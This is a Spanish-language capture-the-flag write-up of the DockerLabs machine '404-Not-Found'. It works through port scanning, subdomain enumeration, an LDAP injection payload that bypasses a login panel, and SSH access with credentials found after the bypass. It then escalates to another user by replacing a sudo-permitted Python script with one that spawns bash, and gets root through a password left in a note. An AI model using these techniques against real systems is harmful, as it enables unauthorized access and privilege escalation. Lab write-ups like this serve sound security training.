---
title: DockerLabs - 404-Not-Found
summary: "Write-up del laboratorio 404-Not-Found de DockerLabs"
author: elcybercurioso
date: 2026-01-11
categories: [Post, DockerLabs]
tags: [medio, subdomain enumeration, ldap, credentials leaking, sudo, permissions abuse]
media_subpath: "/assets/img/posts/dockerlabs_404-not-found"
image:
  path: main.webp
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/404-Not-Found]
└─$ nmap -p- -sS --min-rate 5000 -n -Pn 172.17.0.2 -oG allPorts
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/404-Not-Found]
└─$ nmap -sCV -p22,80 172.17.0.2                               
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 59:4e:10:e2:31:bf:13:43:c9:69:9e:4f:3f:a2:95:a6 (ECDSA)
|_  256 fb:dc:ca:6e:f5:d6:5a:41:25:2b:b2:21:f1:71:16:6c (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Did not follow redirect to http://404-not-found.hl/
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## análisis

Comenzamos revisando la página principal del puerto 80 de la máquina, donde vemos que nos redirige a un dominio:

![Desktop View](/20260106113139.webp){: width="972" height="589" .shadow}

Para que nos resuelva dicho dominio, lo tenemos que agregar al fichero `/etc/hosts` de nuestra máquina:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/404-Not-Found]
└─$ cat /etc/hosts                                                     
...
172.17.0.2      404-not-found.hl
...
```

Si ahora volvemos a recargar la página, veremos que se nos cargan correctamente los recursos:

![Desktop View](/20260106113343.webp){: width="972" height="589" .shadow}

Al pinchar en el botón `¡Participa Ahora!` vemos que nos redirige al recurso `/participar.html`:

![Desktop View](/20260106113441.webp){: width="972" height="589" .shadow}

La resolución de la primera ecuación es **17**.

En cuanto a la clave secreta, se trata de una cadena codificada en Base64:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/404-Not-Found]
└─$ echo "UXVlIGhhY2VzPywgbWlyYSBlbiBsYSBVUkwu" | base64 -d
Que haces?, mira en la URL.
```

Tras revisar el código fuente de la página, vemos que nos dan otra pista:

![Desktop View](/20260106114432.webp){: width="972" height="589" .shadow}

Dado que estamos tratando con dominios, es importante valorar la posibilidad de que existan subdominios dentro del mismo dominio, por lo que usaremos **gobuster** para ver si encontramos algún subdominio existente:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/404-Not-Found]
└─$ gobuster vhost -u 'http://404-not-found.hl' -t 200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r --ad
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://404-not-found.hl
[+] Method:                    GET
[+] Threads:                   200
[+] Wordlist:                  /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:                gobuster/3.8
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
info.404-not-found.hl Status: 200 [Size: 2023]
Progress: 114442 / 114442 (100.00%)
===============================================================
Finished
===============================================================
```

Para que el subdominio `info.404-not-found.hl` resuelva correctamente, lo debemos agregar también al fichero `/etc/hosts`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/404-Not-Found]
└─$ cat /etc/hosts
...
172.17.0.2      404-not-found.hl info.404-not-found.hl
...
```

## acceso inicial (404-page)

Si accedemos a este subdominio, veremos que nos encontraremos con un panel de autenticación:

![Desktop View](/20260106114234.webp){: width="972" height="589" .shadow}

Proporcionando credenciales erróneas, veremos que indica el siguiente mensaje de error:

![Desktop View](/20260106114734.webp){: width="972" height="589" .shadow}

En el código fuente de la página encontramos una pista reveladora, la cual indica que posiblemente el login se esté realizando con LDAP:

![Desktop View](/20260106114817.webp){: width="750" height="430" .shadow}

Siendo ese el caso, nos dirigimos a [HackTricks](https://book.hacktricks.wiki/en/pentesting-web/ldap-injection.html?highlight=LDAP#ldap) a la parte de **LDAP Injection**, donde nos dan posibles formas de saltarnos paneles de autenticación:

![Desktop View](/20260106115400.webp){: width="972" height="589" .shadow}

Si vamos probando los diferentes payloads que nos ofrecen, llegaremos a uno que nos permitirá bypassear este panel:

```bash
*)(|(password=*
```

![Desktop View](/20260106115335.webp){: width="972" height="589" .shadow}

Una vez dentro, nos encontraremos con unas credenciales de administrador:

![Desktop View](/20260106115659.webp){: width="972" height="589" .shadow}

Comprobamos si se tratan de las credenciales para entrar a este mismo panel, pero nos daremos cuenta de que no es así.

Otro sitio donde podemos probar es para acceder por SSH, donde vemos que podemos acceder correctamente como el usuario `404-page`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/404-Not-Found]
└─$ ssh 404-page@172.17.0.2                                                
404-page@f91d1350e6b6:~$ whoami
404-page
404-page@f91d1350e6b6:~$ hostname
f91d1350e6b6
```

Listamos los usuarios que tengan asignados una consola en el fichero `/etc/passwd`:

```bash
404-page@f91d1350e6b6:~$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
404-page:x:1001:1001:404-page,,,:/home/404-page:/bin/bash
200-ok:x:1000:1000:200-ok,,,:/home/200-ok:/bin/bash
```

## movimiento lateral (200-ok)

En los permisos SUDO del usuario `404-page`, veremos que nos indican que podemos ejecutar el script `/home/404-page/calculator.py` como el usuario `200-ok`:

```bash
404-page@f91d1350e6b6:~$ sudo -l
[sudo] password for 404-page: 
Matching Defaults entries for 404-page on f91d1350e6b6:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User 404-page may run the following commands on f91d1350e6b6:
    (200-ok : 200-ok) /home/404-page/calculator.py
```

En los permisos del script `/home/404-page/calculator.py` podemos ver que se nos permite únicamente ejecutar este script:

```bash
404-page@f91d1350e6b6:~$ ls -la /home/404-page/calculator.py
-rwx--x--x 1 200-ok 200-ok 784 Aug 19  2024 /home/404-page/calculator.py
```

Sin embargo, debido a que se encuentra dentro de la carpeta principal del usuario `404-page`, podemos borrarlo y volver a crearlo (los permisos de la carpeta nos permiten crear y eliminar ficheros):

```bash
404-page@f91d1350e6b6:~$ rm /home/404-page/calculator.py
rm: remove write-protected regular file '/home/404-page/calculator.py'? y
404-page@f91d1350e6b6:~$ ls
404-page@f91d1350e6b6:~$ touch calculator.py
404-page@f91d1350e6b6:~$ ls
calculator.py
404-page@f91d1350e6b6:~$ ls -la calculator.py 
-rw-rw-r-- 1 404-page 404-page 0 XXX  X XX:XX calculator.py
```

Ahora que tenemos permisos para modificar el script, indicamos las instrucciones que se encarguen de invocarnos una consola a la hora de ejecutarlo, ya que si lo ejecutamos con los permisos del usuario `200-ok`, obtendremos una consola como dicho usuario.

Primero le volvemos a dar permisos de ejecución al script, para poder ejecutarlo tal y como se indica en los permisos SUDO, y luego indicamos las instrucciones en Python:

```bash
404-page@f91d1350e6b6:~$ chmod +x calculator.py
404-page@f91d1350e6b6:~$ echo -ne '#!/usr/bin/python3\nimport os\nos.system("/bin/bash")\n' > calculator.py 
```

Si ahora ejecutamos el script, obtenendremos la consola como el usuario `200-ok`:

```bash
404-page@f91d1350e6b6:~$ sudo -u 200-ok /home/404-page/calculator.py
200-ok@f91d1350e6b6:/home/404-page$ whoami
200-ok
```

En el directorio principal del usuario `200-ok` encontramos la primera flag:

```bash
200-ok@f91d1350e6b6:~$ cat user.txt 
bef4****************************
```

## escalada de privilegios (root)

También encontramos una nota en el directorio principal del usuario `200-ok`:

```bash
200-ok@f91d1350e6b6:~$ cat boss.txt 

What is *********
```

En el fichero `.bash_history` encontramos una serie de comandos ejecutados por el usuario `200-ok`, que en cierto punto lee la nota `boss.txt`, y luego se conecta como `root`:

```bash
200-ok@f91d1350e6b6:~$ cat .bash_history 
...
su root
cat boss.txt 
su root
exit
```

Esto podría indicar que la contraseña del usuario `root` está en la nota `boss.txt`, así que probamos con cada palabra para ver si este es el caso, y descubrimos que efectivamente la contraseña es la 3a palabra de la nota:

```bash
200-ok@f91d1350e6b6:~$ su root
Password: 
root@f91d1350e6b6:/home/200-ok# whoami
root
```

La segunda flag es:

```bash
root@f91d1350e6b6:/home/200-ok# cat /root/root.txt 
2424****************************
```

Aquí se termina la resolución de la máquina `404-Not-Found`!

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>